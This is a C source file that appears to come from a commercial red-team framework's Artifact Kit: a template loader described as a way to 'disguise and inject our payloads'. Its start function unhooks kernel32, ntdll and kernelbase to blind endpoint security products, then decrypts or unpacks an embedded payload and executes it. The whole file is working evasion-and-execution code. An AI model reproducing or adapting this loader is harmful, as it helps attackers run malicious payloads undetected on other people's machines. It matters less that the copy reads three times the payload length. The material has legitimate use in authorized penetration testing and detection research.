/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2014 Strategic Cyber LLC
 *
 * See http://www.advancedpentest.com/license
 *
 * This file won't get past any anti-virus. It's a template.
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#include "unhook.h"
#include "debug.h"

/* The start function gets called when the bypass is ready to execute. The HINSTANCE is
   a handle to the current artifact. You can use this to determine the location of this
   artifact on disk (if it helps your bypass technique) */
void start(HINSTANCE mhandle) {
	/* phear is a struct that defines how artifact.cna will patch the payload data
	   into this artifact. You're welcome to update artifact.cna to use your own
	   convention if you like. */
	phear * payload = (phear *)data;
	char * buffer;

	char *dll[] = {"kernel32.dll", "ntdll.dll", "kernelbase.dll"};
	for (int i = 0; i < sizeof(dll) / sizeof(dll[0]); ++i) {
	  unhook(dll[i]);
	  DEBUG_MSG("[+] unhooked %s\n", dll[i]);
	}
	
	/* copy our payload into its own buffer... necessary b/c spawn modifies it */
	buffer = (char *)malloc(3*payload->length);
	memcpy(buffer, payload->payload, 3*payload->length);

	/* execute our payload */
	spawn(buffer, payload->length, payload->key);

	/* clean up after ourselves */
	free(buffer);
}
